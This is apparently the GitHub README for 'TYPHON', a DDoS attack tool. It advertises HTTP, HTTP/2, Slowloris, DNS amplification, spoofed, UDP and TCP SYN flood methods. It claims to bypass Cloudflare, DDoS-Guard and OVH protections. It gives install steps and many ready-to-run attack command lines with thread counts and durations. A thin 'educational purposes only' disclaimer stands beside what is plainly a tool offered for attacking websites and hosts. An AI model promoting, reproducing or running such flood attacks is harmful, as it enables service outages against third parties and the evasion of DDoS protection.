<div align="center">

<img src="/typhon_logo.png" alt=" logo " width="500" height="auto">

</div>

<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=700&size=35&duration=3000&pause=1000&color=F70000&center=true&vCenter=true&random=false&width=600&height=70&lines=⚡+TYPHON+DDoS+⚡;🔥+POWERFUL+DDoS+TOOL+🔥;🛡️+MULTI-BYPASS+SYSTEM+🛡️;🚀+V1.0+WITH+NEW+FEATURES+🚀" alt="Typing SVG" />

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0-red?style=for-the-badge&logo=github&logoColor=white" alt="Version"/>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Termux-brightgreen?style=for-the-badge&logo=linux&logoColor=white" alt="Platform"/>
  <img src="https://img.shields.io/badge/Language-Python%203.x-blue?style=for-the-badge&logo=python&logoColor=yellow" alt="Language"/>
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="License"/>
  <img src="https://img.shields.io/badge/Threads-500%2B-orange?style=for-the-badge" alt="Threads"/>
  <img src="https://img.shields.io/badge/Proxy-Auto%20Rotation-green?style=for-the-badge" alt="Proxy"/>
</p>

<br/>


<p align="center">
  <b> Advanced DDoS Attack Tool with Multiple Bypass Capabilities </b><br>
  <b> Auto-Proxy Rotation • Thread Pool Optimization • Built-in Logging </b>
</p>

---

## ⚠️ DISCLAIMER ⚠️

<div align="left">

> **🚨 IMPORTANT LEGAL NOTICE**
> 
> - ⚠️ This tool was created for **EDUCATIONAL PURPOSES ONLY**
> - ⚠️ All responsibilities and consequences of using this program lie with the **USER**
> - ⚠️ The developers assume **NO LIABILITY** and are **NOT RESPONSIBLE** for any misuse or damage
> -  Use this tool only in controlled environments for learning about network security

</div>

---

## 🌟 FEATURES


| 🛡️ Protection Bypass | ⚡ Attack Methods | 🛠️ Utilities |
|:---------------------:|:-----------------:|:------------:|
| Cloudflare UAM | Layer 7 Attacks | DNS Lookup |
| Cloudflare BFM | Layer 4 Attacks | GeoIP Lookup |
| Cloudflare NOSEC | HTTP/2 Support | Subnet Scanner |
| DDoS-Guard | Multi-threading | IP Tools |
| BlazingFast | Proxy Support | Network Info |
| OVH | Custom Headers | Port Scanner |


###  FEATURES

| Feature | Description |
|---------|-------------|
|  **Auto-Proxy Rotation** | Proxies refresh every 60 seconds automatically |
|  **Thread Pool Optimization** | Efficient thread management with configurable limits |
|  **Built-in Logging** | All attacks logged to `typhon.log` with timestamps |
|  **Slowloris Attack** | Keep-alive connections that never complete |
|  **DNS Amplification** | Reflection attack using public DNS resolvers |
|  **HTTP/2 with Proxies** | HTTP/2 flood with integrated proxy rotation |
|  **Progress Bar** | Visual progress indicator for operations |
|  **Enhanced UI** | Gradient banners, attack-specific ASCII art |

---

---

---

## 🛠️ AVAILABLE METHODS

<details open>
<summary><b>🔴 Layer 7 - Application Layer Attacks</b></summary>
<br>

| Method | Command | Description | Bypass |
|--------|---------|-------------|---------|
| `bypass` | `bypass <url> <threads> <time>` | Bypass Cloudflare protection | ✅ CF UAM/BMF |
| `flood` | `flood <url> <threads> <time>` | HTTP Flood with high threads | ✅ DDoS-Guard |
| `httpx` | `httpx <url> <threads> <time>` | HTTP/2.0 Request Attack | ✅ CloudFront |
| `httpxp` | `httpxp <url> <threads> <time>` | HTTP/2 with Proxy Rotation | ✅ CloudFront + IP Ban |
| `slowloris` | `slowloris <url> <threads> <time>` | Slowloris Keep-Alive Attack | ✅ Many WAFs |
| `dnsamp` | `dnsamp <url> <threads> <time>` | DNS Amplification Attack | ✅ Reflection |
| `spoof` | `spoof <url> <threads> <time>` | Spoofed Request Attack | ✅ NOSEC |
| `get` | `get <url> <threads> <time>` | GET Request Flood | ✅ Standard |
| `post` | `post <url> <threads> <time>` | POST Request Flood | ✅ Standard |
| `head` | `head <url> <threads> <time>` | HEAD Request Flood | ✅ Standard |
| `soc` | `soc <url> <threads> <time>` | Socket Connection Attack | ✅ TCP Bypass |
| `pps` | `pps <url> <threads> <time>` | Packets Per Second Attack | ✅ Standard |

</details>

<details open>
<summary><b>🔵 Layer 4 - Transport Layer Attacks</b></summary>
<br>

| Method | Command | Description | Protocol |
|--------|---------|-------------|----------|
| `udp` | `udp <ip> <port> <threads> <time>` | UDP Flood Attack | UDP |
| `tcp` | `tcp <ip> <port> <threads> <time>` | TCP SYN Flood Attack | TCP |

</details>

<details>
<summary><b>🟢 Tools & Utilities</b></summary>
<br>

| Tool | Command | Description |
|------|---------|-------------|
| `dns` | `dns <domain>` | Classic DNS Lookup |
| `geoip` | `geoip <ip>` | Geo IP Address Lookup |
| `subnet` | `subnet <ip>` | Subnet Information Lookup |
| `info` | `info` | Developer Information |
| `clear` | `clear` | Clear Console |
| `exit` | `exit` | Exit Program |

</details>

---

##  INSTALLATION

###  Linux Installation


```
sudo apt update && sudo apt upgrade -y

sudo apt install python3 python3-pip git wget -y
```
### Clone Repository
```
git clone https://github.com/Athexblackhat/TYPHON.git

cd TYPHON/

pip3 install -r requirements.txt
```

### Run TYPHON
```
python3 main.py
```

## 📱 Termux Installation


```
pkg update && pkg upgrade -y

pkg install python3 python3-pip git -y
```
### Clone Repository
```
git clone https://github.com/Athexblackhat/TYPHON.git

cd TYPHON/

pip3 install -r requirements.txt
```

### Run TYPHON
```
python3 main.py
```

## 🚀 USAGE EXAMPLES

***Interactive Mode (Recommended)***
```
python3 main.py
```
- ***Then use commands:***

```
root@athex:~# httpx https://example.com/ 1000 100
root@athex:~# slowloris https://target.com/ 500 200
root@athex:~# dnsamp https://target.com/ 300 100
root@athex:~# help
```
### Command Line Mode
***Basic HTTP Flood Attack***
```
python3 main.py flood https://example.com/ 1000 1000
```

***Cloudflare Bypass Attack***
```
python3 main.py bypass https://target.com/ 500 100
```
***HTTP/2.0 Request Attack***
```
python3 main.py httpx https://target.com/ 800 200
```

***HTTP/2 with Proxy Rotation***
```
python3 main.py httpxp https://target.com/ 600 150
```

***Slowloris Keep-Alive Attack***
```
python3 main.py slowloris https://target.com/ 400 300
```
***DNS Amplification Attack***
```
python3 main.py dnsamp https://target.com/ 300 100
```
***UDP Flood Attack***
```
python3 main.py udp 192.168.1.1 80 1000 60
```
***TCP SYN Flood Attack***
```
python3 main.py tcp 192.168.1.1 443 500 60
```
***DNS Lookup***
```
python3 main.py dns google.com
```
***GeoIP Lookup***
```
python3 main.py geoip 8.8.8.8
```

## 👨‍💻 DEVELOPER
<div align="center">
MADE WITH ♥ BY ATHEX BLACK HAT
TEAM WOLF INTELLIGENCE PK
</div>
